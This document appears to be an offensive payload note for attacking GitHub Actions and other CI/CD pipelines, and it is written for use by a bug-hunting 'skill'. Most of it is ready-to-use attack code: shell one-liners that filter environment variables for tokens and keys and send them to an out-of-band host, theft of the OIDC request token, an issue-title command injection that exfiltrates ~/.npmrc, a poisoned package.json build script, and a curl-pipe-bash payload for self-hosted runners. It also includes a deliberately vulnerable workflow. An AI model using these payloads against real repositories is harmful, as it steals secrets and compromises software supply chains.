---
title: "Payloads: CI/CD Pipeline Attacks"
type: payloads
tags: [payloads, cicd, github-actions, supply-chain]
sources: []
date_created: 2026-06-17
date_updated: 2026-06-17
---

# Payloads: CI/CD Pipeline Attacks

GitHub Actions and pipeline abuse. Routed via the `hunt-cicd` skill. See [[cicd-github-actions]].

## Pwn request (pull_request_target checks out untrusted fork code with secrets in scope)
```yaml
# VULNERABLE workflow an attacker targets
on:
  pull_request_target:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:                                   # checks out the attacker's fork HEAD...
          ref: ${{ github.event.pull_request.head.ref }}
          repository: ${{ github.event.pull_request.head.repo.full_name }}
      - run: make build                          # ...then runs it WITH base-repo secrets
```
```bash
# attacker payload placed in the forked PR (e.g. a build script the workflow runs)
env | grep -iE 'token|secret|aws|key' | curl -X POST --data-binary @- https://<oob>/x
# steal the OIDC token used for cloud/npm publish from runner env
echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN $ACTIONS_ID_TOKEN_REQUEST_URL" | curl -d @- https://<oob>/o
```

## Script injection (untrusted ${{ github.event.* }} interpolated into a shell run)
```yaml
- run: echo "${{ github.event.issue.title }}"   # title = a"; curl https://<oob>/$(cat ~/.npmrc); #
```

## Poisoned Pipeline Execution (PPE) without touching .github/workflows (bypasses CODEOWNERS)
```bash
# modify a file the pipeline already executes: Makefile / package.json scripts / build.gradle
# package.json:  "scripts": { "build": "node build.js; curl https://<oob>/$(env|base64)" }
```

## Self-hosted runner takeover (non-ephemeral = persistence + cross-repo)
```yaml
on: pull_request
jobs:
  x:
    runs-on: [self-hosted]                       # land on the shared runner host
    steps:
      - run: curl -k https://<attacker>/exec.sh | bash   # persists between jobs on non-ephemeral runners
```

## Cache poisoning across the fork/base trust boundary
```bash
# a fork-triggered job writes a poisoned actions/cache entry that a later trusted base job restores,
# injecting a tampered dependency/binary into the trusted build (see @tanstack 2025 npm chain).
```
